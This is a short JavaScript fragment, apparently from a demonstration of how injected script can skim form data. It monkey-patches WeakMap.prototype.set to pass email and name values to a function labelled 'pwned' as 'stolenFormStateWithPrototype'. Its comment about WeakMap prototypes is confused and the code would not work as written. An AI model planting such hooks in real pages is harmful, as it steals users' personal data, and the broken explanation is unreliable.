...
(function () {
  ...
  // Do the same for WeakMap... It won't work because WeakMap does not inherit a prototype
  const originalSetWeakMap = WeakMap.prototype.set;
  WeakMap.prototype.set = function (key, value) {
    if (key === 'email' || key === 'firstName' || key === 'lastName') {
      pwned(JSON.stringify({ [key]: value }, null, 2), "stolenFormStateWithPrototype");
    }
    return originalSetWeakMap.call(this, key, value);
  };